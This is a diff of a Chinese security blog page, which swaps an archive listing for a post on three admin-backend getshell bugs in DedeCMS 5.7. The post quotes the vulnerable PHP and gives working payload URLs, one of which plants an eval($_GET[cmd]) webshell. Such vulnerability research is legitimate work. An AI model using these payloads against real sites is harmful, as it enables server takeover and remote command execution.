@@ -6,18 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | 风筝</title>
+  <title>dedecms最新版后台三处getshell | 风筝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="风筝">
-<meta property="og:type" content="website">
-<meta property="og:title" content="风筝">
-<meta property="og:url" content="http://yoursite.com/archives/page/3/index.html">
+  <meta name="description" content="dedecms后台getshell0x01dedecms全局变量注册特性原理(在include/common.inc.php) 12345678910...    foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request)    &amp;#123;        foreach($$_request as $_k =&amp;gt; $_v)		&amp;#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dedecms最新版后台三处getshell">
+<meta property="og:url" content="http://yoursite.com/2019/10/14/dedecms5.7/index.html">
 <meta property="og:site_name" content="风筝">
-<meta property="og:description" content="风筝">
+<meta property="og:description" content="dedecms后台getshell0x01dedecms全局变量注册特性原理(在include/common.inc.php) 12345678910...    foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request)    &amp;#123;        foreach($$_request as $_k =&amp;gt; $_v)		&amp;#123;">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/10/u7kAit.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/10/u7el8I.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/10/u7eB2q.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/11/uqMMLR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/11/uqKHsA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/14/KSAUFx.png">
+<meta property="og:updated_time" content="2019-10-14T10:54:20.811Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="风筝">
-<meta name="twitter:description" content="风筝">
+<meta name="twitter:title" content="dedecms最新版后台三处getshell">
+<meta name="twitter:description" content="dedecms后台getshell0x01dedecms全局变量注册特性原理(在include/common.inc.php) 12345678910...    foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request)    &amp;#123;        foreach($$_request as $_k =&amp;gt; $_v)		&amp;#123;">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/10/10/u7kAit.png">
   
     <link rel="alternative" href="/atom.xml" title="风筝" type="application/atom+xml">
   
@@ -153,106 +161,177 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-dedecms5.7" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      dedecms最新版后台三处getshell
+    </h1>
+  
+
+        
+        <a href="/2019/10/14/dedecms5.7/" class="archive-article-date">
+  	<time datetime="2019-10-14T10:54:20.810Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-14</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="dedecms后台getshell"><a href="#dedecms后台getshell" class="headerlink" title="dedecms后台getshell"></a>dedecms后台getshell</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>dedecms全局变量注册特性原理(在include/common.inc.php)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $_request)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_k =&gt; $_v)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>($_k == <span class="string">'nvarname'</span>) $&#123;$_k&#125; = $_v;</span><br><span class="line">			<span class="keyword">else</span> $&#123;$_k&#125; = <span class="string">'123'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> $_v;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>漏洞发生在dede/tql.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($action==<span class="string">'savetagfile'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    csrf_check();</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i"</span>, $filename))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">'文件名不合法，不允许进行操作！'</span>, <span class="string">'-1'</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">'/oxwindow.class.php'</span>);</span><br><span class="line">    $tagname = preg_replace(<span class="string">"#\.lib\.php$#i"</span>, <span class="string">""</span>, $filename);</span><br><span class="line">    $content = stripslashes($content);</span><br><span class="line">    $truefile = DEDEINC.<span class="string">'/taglib/'</span>.$filename;</span><br><span class="line">    $fp = fopen($truefile, <span class="string">'w'</span>);</span><br><span class="line">    fwrite($fp, $content);</span><br><span class="line">    fclose($fp);</span><br></pre></td></tr></table></figure>
+<p>首先因为dedecms全局变量注册的特性，这里的$filename和$content是可控的，然后文件名经过preg_match函数正则表达式的过滤，也就是以字母数字下划线开头，最后以.lib.php为结尾,不分大小写</p>
+<p>然后是csrf_check()这个函数定义是(/dede/config.php)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($token) || strcasecmp($token, $_SESSION[<span class="string">'token'</span>]) != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="http://bbs.dedecms.com/907721.html"&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>就是请求时需要token参数，这个参数在?action=upload中获得</p>
+<p><img src="https://s2.ax1x.com/2019/10/10/u7kAit.png" alt="image"></p>
+<p><img src="https://s2.ax1x.com/2019/10/10/u7el8I.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http://127.0.0.1/uploads/dede/tpl.php?action=savetagfile&amp;filename=test.lib.php&amp;content=%3C?php%20phpinfo();%20?%3E&amp;token=adaf26b4e811c8543e735c764c177d83</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/10/10/u7eB2q.png" alt="image"></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>漏洞发生在dede/sys_verifies.php处<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($action == <span class="string">'getfiles'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($refiles))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"你没进行任何操作！"</span>,<span class="string">"sys_verifies.php"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $cacheFiles = DEDEDATA.<span class="string">'/modifytmp.inc'</span>;</span><br><span class="line">    $fp = fopen($cacheFiles, <span class="string">'w'</span>);</span><br><span class="line">    fwrite($fp, <span class="string">'&lt;'</span>.<span class="string">'?php'</span>.<span class="string">"\r\n"</span>);</span><br><span class="line">    fwrite($fp, <span class="string">'$tmpdir = "'</span>.$tmpdir.<span class="string">'";'</span>.<span class="string">"\r\n"</span>);</span><br><span class="line">    $dirs = <span class="keyword">array</span>();</span><br><span class="line">    $i = <span class="number">-1</span>;</span><br><span class="line">    $adminDir = preg_replace(<span class="string">"#(.*)[\/\\\\]#"</span>, <span class="string">""</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">    <span class="keyword">foreach</span>($refiles <span class="keyword">as</span> $filename)</span><br><span class="line">    &#123;</span><br><span class="line">        $filename = substr($filename,<span class="number">3</span>,strlen($filename)<span class="number">-3</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"#^dede/#i"</span>, $filename)) </span><br><span class="line">        &#123;</span><br><span class="line">            $curdir = GetDirName( preg_replace(<span class="string">"#^dede/#i"</span>, $adminDir.<span class="string">'/'</span>, $filename) );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $curdir = GetDirName($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( !<span class="keyword">isset</span>($dirs[$curdir]) ) </span><br><span class="line">        &#123;   </span><br><span class="line">            $dirs[$curdir] = TestIsFileDir($curdir);</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">        fwrite($fp, <span class="string">'$files['</span>.$i.<span class="string">'] = "'</span>.$filename.<span class="string">'";'</span>.<span class="string">"\r\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite($fp, <span class="string">'$fileConut = '</span>.$i.<span class="string">';'</span>.<span class="string">"\r\n"</span>);</span><br><span class="line">    fwrite($fp, <span class="string">'?'</span>.<span class="string">'&gt;'</span>);</span><br><span class="line">    fclose($fp);</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwrite($fp, <span class="string">'$files['</span>.$i.<span class="string">'] = "'</span>.$filename.<span class="string">'";'</span>.<span class="string">"\r\n"</span>);</span><br></pre></td></tr></table></figure>
+<p>关键在这一行，将数组$refiles的内容全部写入/data/modifytmp.inc中</p>
+<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[1]=\&quot;;eval($_GET[cmd]);//</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/10/11/uqMMLR.png" alt="image"><br><img src="https://s2.ax1x.com/2019/10/11/uqKHsA.png" alt="image"></p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>漏洞发生在stepselect_main.php文件中，?action=addenum_save</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($action==<span class="string">'addenum_save'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($ename) || <span class="keyword">empty</span>($egroup)) </span><br><span class="line">    &#123;</span><br><span class="line">         Showmsg(<span class="string">"类别名称或组名称不能为空！"</span>,<span class="string">"-1"</span>);</span><br><span class="line">         <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($issign == <span class="number">1</span> || $topvalue == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $enames = explode(<span class="string">','</span>, $ename);</span><br><span class="line">        <span class="keyword">foreach</span>($enames <span class="keyword">as</span> $ename)</span><br><span class="line">        &#123;</span><br><span class="line">            $arr = $dsql-&gt;GetOne(<span class="string">"SELECT * FROM `#@__sys_enum` WHERE egroup='$egroup' AND (evalue MOD 500)=0 ORDER BY disorder DESC "</span>);</span><br><span class="line">            <span class="keyword">if</span>(!is_array($arr)) $disorder = $evalue = ($issign==<span class="number">1</span> ? <span class="number">1</span> : <span class="number">500</span>);</span><br><span class="line">            <span class="keyword">else</span> $disorder = $evalue = $arr[<span class="string">'disorder'</span>] + ($issign==<span class="number">1</span> ? <span class="number">1</span> : <span class="number">500</span>);</span><br><span class="line">                </span><br><span class="line">            $dsql-&gt;ExecuteNoneQuery(<span class="string">"INSERT INTO `#@__sys_enum`(`ename`,`evalue`,`egroup`,`disorder`,`issign`) </span></span><br><span class="line"><span class="string">                                    VALUES('$ename','$evalue','$egroup','$disorder','$issign'); "</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        WriteEnumsCache($egroup);                                                          </span><br><span class="line">        ShowMsg(<span class="string">"成功添加枚举分类！"</span>.$dsql-&gt;GetError(), $ENV_GOBACK_URL);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+<p>WriteEnumsCache函数定义为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WriteEnumsCache</span><span class="params">($egroup=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $dsql;</span><br><span class="line">    $egroups = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span>($egroup==<span class="string">''</span>) &#123;</span><br><span class="line">        $dsql-&gt;SetQuery(<span class="string">"SELECT egroup FROM `#@__sys_enum` GROUP BY egroup "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        $dsql-&gt;SetQuery(<span class="string">"SELECT egroup FROM `#@__sys_enum` WHERE egroup='$egroup' GROUP BY egroup "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $dsql-&gt;Execute(<span class="string">'enum'</span>);</span><br><span class="line">    <span class="keyword">while</span>($nrow = $dsql-&gt;GetArray(<span class="string">'enum'</span>)) &#123;</span><br><span class="line">        $egroups[] = $nrow[<span class="string">'egroup'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span>($egroups <span class="keyword">as</span> $egroup)</span><br><span class="line">    &#123;</span><br><span class="line">        $cachefile = DEDEDATA.<span class="string">'/enums/'</span>.$egroup.<span class="string">'.php'</span>;</span><br><span class="line">        $fp = fopen($cachefile,<span class="string">'w'</span>);</span><br><span class="line">        fwrite($fp,<span class="string">'&lt;'</span>.<span class="string">"?php\r\nglobal \$em_&#123;$egroup&#125;s;\r\n\$em_&#123;$egroup&#125;s = array();\r\n"</span>);</span><br><span class="line">        $dsql-&gt;SetQuery(<span class="string">"SELECT ename,evalue,issign FROM `#@__sys_enum` WHERE egroup='$egroup' ORDER BY disorder ASC, evalue ASC "</span>);</span><br><span class="line">        $dsql-&gt;Execute(<span class="string">'enum'</span>);</span><br><span class="line">        $issign = <span class="number">-1</span>;</span><br><span class="line">        $tenum = <span class="keyword">false</span>; <span class="comment">//三级联动标识</span></span><br><span class="line">        <span class="keyword">while</span>($nrow = $dsql-&gt;GetArray(<span class="string">'enum'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            fwrite($fp,<span class="string">"\$em_&#123;$egroup&#125;s['&#123;$nrow['evalue']&#125;'] = '&#123;$nrow['ename']&#125;';\r\n"</span>);</span><br><span class="line">            <span class="keyword">if</span>($issign==<span class="number">-1</span>) $issign = $nrow[<span class="string">'issign'</span>];</span><br><span class="line">            <span class="keyword">if</span>($nrow[<span class="string">'issign'</span>]==<span class="number">2</span>) $tenum = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($tenum) $dsql-&gt;ExecuteNoneQuery(<span class="string">"UPDATE `#@__stepselect` SET `issign`=2 WHERE egroup='$egroup'; "</span>);</span><br><span class="line">        fwrite($fp,<span class="string">'?'</span>.<span class="string">'&gt;'</span>);</span><br><span class="line">        fclose($fp);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($issign)) WriteEnumsJs($egroup);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'成功更新所有枚举缓存！'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/stepselect_main.php?action=addenum_save&amp;ename=123&amp;issign=1&amp;egroup=;phpinfo();$</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/10/14/KSAUFx.png" alt="image"></p>
+<p>参考文章：<br><a href="https://getpass.cn/" target="_blank" rel="noopener">https://getpass.cn/</a></p>
+<p><a href="https://mochazz.github.io/2018/04/03/dedecms%E6%9C%80%E6%96%B0%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/" target="_blank" rel="noopener">https://mochazz.github.io/2018/04/03/dedecms%E6%9C%80%E6%96%B0%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/</a></p>
+<p><a href="https://xz.aliyun.com/t/2237" target="_blank" rel="noopener">https://xz.aliyun.com/t/2237</a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/25/redis/" class="archive-article-date">
-  	<time datetime="2019-03-25T05:32:39.745Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/25/redis/">redis 未授权访问漏洞 getshell</a>
-    </h1>
-  
+      
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/10/14/dedecms5.7/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/21/google hack/" class="archive-article-date">
-  	<time datetime="2019-03-21T11:58:59.313Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-21</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/10/10/ctf夺旗赛/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CTF夺旗赛</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/21/google hack/">Google Hack 语法</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/03/20/lun web/" class="archive-article-date">
-  	<time datetime="2019-03-20T08:43:57.214Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/03/20/lun web/">CTF - 论剑场</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/2/">&laquo; Prev</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span>
-    </nav>
   
 
 
@@ -276,8 +355,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
